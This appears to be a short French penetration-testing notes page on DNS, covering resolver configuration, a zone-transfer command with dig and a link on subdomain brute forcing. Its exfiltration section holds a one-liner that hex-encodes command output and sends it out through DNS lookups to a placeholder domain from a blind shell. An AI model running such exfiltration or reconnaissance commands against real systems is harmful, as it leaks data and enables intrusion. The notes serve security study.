---
title: DNS
permalink: /DNS/
---

# DNS

## Configuration

Sous Linux, le serveur DNS utilisé se configure en modifiant le fichier **/etc/resolv.conf**.

## Exploitation

### Zone Transfer

Il est possible de récupérer des informations en effetuant un **DNS Zone Transfer**. Ici on effectue un transfert de zone du domaine thinc.local sur le serveur DNS 192.168.31.221:

``` bash
dig -t axfr @192.168.31.221 thinc.local
```

### Brute force DNS

<https://blog.bugcrowd.com/discovering-subdomains>

### Exfiltration

On peut utiliser DNS pour exfiltrer des réponses si on a un shell sans retour et aucune possibilité d'avoir un retour direct (nc, http request, etc.)

``` bash
id | xxd -p > /tmp/exfiltration; for line in $(cat /tmp/exfiltration); do dig $line.domain.com; done
```


